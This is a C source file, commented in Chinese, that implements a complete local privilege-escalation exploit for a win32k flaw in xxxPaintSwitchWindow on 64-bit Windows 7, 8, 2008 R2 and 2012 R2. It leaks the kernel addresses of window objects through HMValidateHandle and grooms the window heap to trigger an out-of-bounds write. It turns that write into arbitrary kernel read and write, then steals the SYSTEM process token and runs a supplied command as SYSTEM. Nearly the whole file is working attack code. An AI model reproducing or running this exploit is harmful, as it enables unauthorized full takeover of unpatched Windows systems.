/*
* Windows 2012 R2 (Tested)
* Windows 8 (Tested)
* Windows 2008 R2 x64(Tested)
* Windows 7.1 x64 (Tested)
* Windows 7 x64
* Windows 2012 x64
* Windows 2008 x64
* ALL X32 VERSION SYSTEMS ARE NOT SUPPORTED (Who uses x32 system nowadays?)

*/

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define EXTRABYTES_SIZE_OFFSET_IN_TAGWND 0xE8//tagWND->cbwndExtra偏移 0xE8 额外字节数是由cbWndExtra字段控制的
#define STRNAME_OFFSET_IN_TAGWND 0xD8//tagWND->StrName 偏移 0xD8
#define EXTRABYTES_OFFSET_IN_TAGWND 0x128 //tagWND->ExtraBytes 偏移 0x128 分配的额外内存地址保存在ExtraBytes字段中
#define SPWNDLASTACTIVE_OFFSET_IN_TAGWND 0xF0//tagWND->spwndLastActive 偏移 0xF0

#define EPROCESS_OFFSET_IN_KTHREAD 0x210
#define TOKEN_OFFSET_IN_EPROCESS 0x208
#define EPROCESS_ENTRY_OFFSET_IN_EPROCESS 0x188
#define PID_OFFSET_IN_EPROCESS 0x180
#define OBJECT_HEADER_SIZE 0x30

typedef struct _LARGE_UNICODE_STRING 
{
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, * PLARGE_UNICODE_STRING;

typedef struct _THRDESKHEAD 
{
	HANDLE  h;
	ULONG   cLockObj;
	PVOID   pti;
	PVOID   rpdesk;
	PBYTE   pSelf;//自身地址
} THRDESKHEAD, * PTHRDESKHEAD;

typedef PVOID(__fastcall* HMValidateHandle_t)(HANDLE, UINT);
extern "C" NTSTATUS  NtUserMessageCall(HANDLE hWnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAscii);
extern "C" NTSTATUS  NtUserDefSetText(HANDLE hWnd, PLARGE_UNICODE_STRING plstr);
extern "C" ULONG g_NtUserDefSetText_syscall = 0x107f, g_NtUserMessageCall_syscall = 0x1007;

HMValidateHandle_t HMValidateHandle = 0;

HWND g_hWndList[0x100] = { 0 };
ULONG64 g_spKwnd[0x100] = { 0 };

//find HMValidateHandle
BOOLEAN FindHMValidateHandle() 
{
	int offset = 0;
	ULONG next_code = 0;
	ULONG dwRetBytes = 0;
	int Kernel_Base_index = 0;
	HMODULE hKernel = 0;

	for (int i = 0; i < 0x100; i++) 
	{
		PUCHAR tr = (PUCHAR)IsMenu + i;
		if (*tr == 0xE8)
		{//找到调用HMValidateHandle的指令位置
			offset = *(int*)((PCHAR)IsMenu + i + 1);
			next_code = (ULONG)IsMenu + i + 5;
			HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
			break;
		}
	}

	if (!HMValidateHandle) 
	{
		printf("[!]Error: %d\n", __LINE__ - 1);
		return FALSE;
	}
	printf("[+]Found HMValidateHandle = 0x%p\n", HMValidateHandle);

	return TRUE;
}

//在win7 x64sp1下，需要使用NtUserDefSetText代替SetWindowTextW实现写原语，
//使用InternalGetWindowText代替GetWindowTextW实现读原语，函数名不同，用法基本相同。
//SetWindowText函数会将数据写入tagWND.strname.Buffer
ULONG64 readQWORD(PVOID TargetAddr, HWND hWndAttack, HWND hWndVictim, ULONG64 Offset, PULONG64 OldQword) 
{
	WCHAR qwVal[8] = { 0 };
	ULONG64 ret;
	//设置要读取的地址
	ret = SetWindowLongPtrW(hWndAttack, Offset, (ULONG64)TargetAddr);
	if (OldQword)*OldQword = ret;
	InternalGetWindowText(hWndVictim, qwVal, sizeof(qwVal));
	return *(PULONG64)qwVal;
}

VOID writeQWORD(PVOID TargetAddr, HWND hWndAttack, HWND hWndVictim, ULONG64 Offset, ULONG64 Value, PULONG64 OldQword) 
{
	ULONG64 ret;
	LARGE_UNICODE_STRING data = { 0 };
	//设置要写入的地址
	ret = SetWindowLongPtrW(hWndAttack, Offset, (ULONG64)TargetAddr);
	if (OldQword)*OldQword = ret;
	data.bAnsi = 0;
	data.Length = 8;
	data.MaximumLength = 0xA;
	data.Buffer = (PWCHAR)&Value;
	NtUserDefSetText(hWndVictim, &data);
}



//要利用这个漏洞，需要在触发漏洞的窗口高地址不远处布置另一个用来攻击的窗口，
//所以需要首先创建一些用来攻击的窗口，然后释放掉中间的一部分，这样触发漏洞时候创建的窗口就会占用释放的某个窗口，
//高地址就会保存其他的窗口
VOID Exploit(char* cmd) 
{
	WNDCLASSEXW wcs = { 0 };
	wcs.cbSize = sizeof(WNDCLASSEXW);
	wcs.cbWndExtra = 8;
	wcs.hInstance = GetModuleHandleA(0);
	wcs.lpszMenuName = 0;
	wcs.lpfnWndProc = DefWindowProcW;

	// 创建大量窗口，筛选合适的用来攻击
	for (int i = 0; i < 0x100;) 
	{
		//窗口类
		WCHAR wszClsName[0x20];
		wsprintfW(wszClsName, L"%d", (i + 1) * 1998);
		wcs.lpszClassName = wszClsName;
		if (RegisterClassExW(&wcs) == INVALID_ATOM) 
		{
			continue;
		}

		//创建用来触发漏洞的窗口,且窗口带有WS_VISIBLE
		HWND hTmp = CreateWindowExW(
			NULL,
			wszClsName,
			L"expWin",
			WS_VISIBLE,
			0, 0, 0, 0, 
			NULL, 0, 
			GetModuleHandleA(0), 0
		);
		if (hTmp == INVALID_HANDLE_VALUE) 
		{
			continue;
		}
		PTHRDESKHEAD spRdes = (PTHRDESKHEAD)HMValidateHandle(hTmp, 1);
		g_spKwnd[i] = (ULONG64)spRdes->pSelf;//记录地址
		g_hWndList[i++] = hTmp;//窗口句柄列表
	}

	HWND hWndAttack = 0;
	HWND hWndVictim = 0;
	ULONG64 spKwndAttack = 0;
	ULONG64 spKwndVictim = 0;
	BOOLEAN bOver = FALSE;

	//寻找在内核中位置相距在0xFF0000之内的两个窗口，其余窗口全部销毁
	for (int i = 0; i < 0x100 - 1 && !bOver; i++) 
	{
		for (int j = i + 1; j < 0x100; j++) 
		{
			//较低地址
			hWndAttack = g_spKwnd[i] > g_spKwnd[j] 
				? g_hWndList[j] 
				: g_hWndList[i];
			
			//较高地址
			hWndVictim = (g_spKwnd[i] < g_spKwnd[j]) 
				? g_hWndList[j] 
				: g_hWndList[i];

			spKwndAttack = (g_spKwnd[i] < g_spKwnd[j]) 
				? g_spKwnd[i] 
				: g_spKwnd[j];

			spKwndVictim = (g_spKwnd[i] > g_spKwnd[j]) 
				? g_spKwnd[i] 
				: g_spKwnd[j];

			//位置相距在0xFF0000之内
			if (spKwndVictim - spKwndAttack < 0xFF0000)
			{
				g_hWndList[i] = g_hWndList[j] = 0;//将这两个从句柄列表中抹去
				bOver = TRUE;
				break;
			}
		}
	}
	
	//销毁其余句柄
	for (int i = 0; i < 0x100; i++)
		DestroyWindow(g_hWndList[i]);
	//err
	if (spKwndAttack == 0 || spKwndVictim == 0) 
	{
		printf("[+]Error:%d\n", __LINE__ - 1);
		return;
	}

	printf("[+]spKwndAttack = 0x%p\n", spKwndAttack);
	printf("[+]spKwndVictim = 0x%p\n", spKwndVictim);

	//! 漏洞存在于win32k的xxxPaintSwitchWindow函数中，函数会将窗口对象扩展区域最开始八字节保存的内容取出，将其作为内存地址进行读写。
	//可是这最开始的八字节中保存的内容可以通过SetWindowLong函数进行更改，
	//而函数没有验证保存的内容是否指向合法的地址就进行读写，如果地址不合法，则会产生BSOD错误。
	//通过设置，可以利用函数对指向地址进行读写的操作来扩大窗口的cbwndExtra
	//Calling SetWindowLongPtr to set window extra data
	
	//窗口扩展区域最开始八字节 保存的地址 应当是触发漏洞窗口的cbwndExtra地址减去0x60偏移的地址
	//xxxPaintSwitchWindow函数会将扩展区域中保存的内容赋给rdi 验证保存的地址是否为0，以及保存的地址偏移0x6C的内容是否为0
	// 之后还会对rdi保存的地址偏移0x5C到0x6C这段区域进行增减操作
	//!? 重点是这些操作是会扩大这些与rdi偏移的地址中保存的内容
	//如果把这个地址指向窗口对象的cbwndExtra成员地址偏移-0x60处，最后面的增减操作就会扩大cbwndExtra
	SetWindowLongPtrW(hWndAttack, 0, spKwndAttack + EXTRABYTES_SIZE_OFFSET_IN_TAGWND - 0x60);
	
	//第一次调用NtUserMessageCall目的是给hWndAttack对应的tagWND->fnid赋值0x2A0
	NtUserMessageCall(hWndAttack, WM_CREATE, 0, 0, 0, 0, 0);

	//创建一个类名为#32771的窗口，此窗口的特点是设置[gpsi+0x154]=0x130
	HWND hSwitchWnd = CreateWindowExW(0, L"#32771", L"Switch Window", 0, 0, 0, 0, 0, NULL, NULL, GetModuleHandleA(0), NULL);
	if (hSwitchWnd == INVALID_HANDLE_VALUE) 
	{
		printf("[!]Error: %d\n", __LINE__ - 2);
		return;
	}

	//在到达对内存进行加减操作之前，函数还会判断Alt键是否被按下，所以触发漏洞之前，需要模拟Alt的按键消息才能成功的完成加减的操作
	//模拟alt按键
	BYTE keyState[256];
	GetKeyboardState(keyState);
	keyState[VK_MENU] |= 0x80;
	SetKeyboardState(keyState);
	
	//第二次调用NtUserMessageCall目的是触发漏洞，此时hWndAttack的cbWndExtra已被修改成很大的数
	//触发漏洞 实现越界写
	NtUserMessageCall(hWndAttack, 0x14, 0, 0, 0, 0, 0);

	//此时cbExtra已经被修改为很大的值
	//! 在实现了越界写后，我们可以越界修改hWndVictim对应的tagWND−>strName+8位置处的指针
	//!? SetWindowText函数会将数据写入tagWND.strname.Buffer,如果可以将tagWND.strname.Buffer修改为当前进程token的内核地址，就可以对当前进程的token进行修改。
	//! 这里在计算strName+8 和 Attkack窗口内核地址的偏移，后续读写就需要使用这个偏移
	ULONG64 ulOffset = spKwndVictim - spKwndAttack - EXTRABYTES_OFFSET_IN_TAGWND+ STRNAME_OFFSET_IN_TAGWND + 8;

	printf("[+]ulOffset = 0x%p\n", ulOffset);
	PTHRDESKHEAD spRdes = (PTHRDESKHEAD)HMValidateHandle(hWndVictim, 1);

	ULONG64 ulOld;

	ULONG64 Ethread = readQWORD(spRdes->pti, hWndAttack, hWndVictim, ulOffset, &ulOld);

	printf("[+]ulOld = 0x%p\n", ulOld);
	printf("[+]Ethread = 0x%p\n", Ethread);

	//eprocess
	ULONG64 CurEprocess = readQWORD((PVOID)(Ethread + EPROCESS_OFFSET_IN_KTHREAD),hWndAttack, hWndVictim, ulOffset, NULL);
	ULONG64 NextEprocess = CurEprocess;
	printf("[+]CurEprocess = 0x%p\n", CurEprocess);

	ULONG64 CurPid = GetCurrentProcessId();//pid
	ULONG64 Pid = 0;
	ULONG64 Token = 0;
	ULONG64 OldToken = 0;
	PVOID TokenAddress = NULL;
	ULONG64 RefCnt;

	do 
	{
		Pid = readQWORD((PVOID)(NextEprocess + PID_OFFSET_IN_EPROCESS),hWndAttack, hWndVictim, ulOffset, NULL);
		if (Pid == 4) 
		{
			Token = readQWORD((PVOID)(NextEprocess + TOKEN_OFFSET_IN_EPROCESS),hWndAttack, hWndVictim, ulOffset, NULL);
		}
		else if (Pid == CurPid) 
		{
			TokenAddress = (PVOID)(NextEprocess + TOKEN_OFFSET_IN_EPROCESS);
			OldToken = readQWORD((PVOID)(NextEprocess + TOKEN_OFFSET_IN_EPROCESS),hWndAttack, hWndVictim, ulOffset, NULL);
		}
		NextEprocess = readQWORD((PVOID)(NextEprocess + EPROCESS_ENTRY_OFFSET_IN_EPROCESS),hWndAttack, hWndVictim, ulOffset, NULL) - EPROCESS_ENTRY_OFFSET_IN_EPROCESS;
	} 
	while (NextEprocess != CurEprocess);

	printf("[+]TokenAddress = 0x%p\n", TokenAddress);
	printf("[+]Token = 0x%p\n", Token);

	if (Token && TokenAddress) 
	{
		/*	RefCnt = readQWORD((PVOID)((Token & 0xFFFFFFFFFFFFFFF0) - OBJECT_HEADER_SIZE ),hWndAttack, hWndVictim, ulOffset, NULL);
			printf("[+]System token RefCnt = %d\n", RefCnt);*/

		//修改令牌前，需要先修改令牌的引用计数
		/*	writeQWORD((PVOID)((Token & 0xFFFFFFFFFFFFFFF0) - OBJECT_HEADER_SIZE),hWndAttack, hWndVictim, ulOffset, RefCnt + 2, NULL);*/
		writeQWORD((PVOID)TokenAddress,hWndAttack, hWndVictim, ulOffset, (Token & 0xFFFFFFFFFFFFFFF0), NULL);

		printf("[*]Try execute %s as SYSTEM!\n", cmd);
		system(cmd);

	}
	else 
	{
		printf("[-]Privilege escalation Failed!\n");
	}
	//
	// 防蓝屏操作
	//writeQWORD((PVOID)TokenAddress,
	//	hWndAttack, hWndVictim, ulOffset, OldToken,NULL);
	writeQWORD((PVOID)(spKwndAttack + STRNAME_OFFSET_IN_TAGWND),hWndAttack, hWndVictim, ulOffset, 0, NULL);
	writeQWORD((PVOID)(spKwndAttack + STRNAME_OFFSET_IN_TAGWND + 8),hWndAttack, hWndVictim, ulOffset, 0, NULL);
	writeQWORD((PVOID)(spKwndAttack + SPWNDLASTACTIVE_OFFSET_IN_TAGWND),hWndAttack, hWndVictim, ulOffset, 0, NULL);
	SetWindowLongPtrW(hWndAttack, ulOffset, ulOld);

	return;
}

int main(int argc, char** argv) 
{
	if (FindHMValidateHandle()) 
	{
		Exploit(argv[1]);
	}
	else 
	{
		printf("[!]Error: %d\n", __LINE__ - 3);
	}
	system("pause");
	return 0;
}
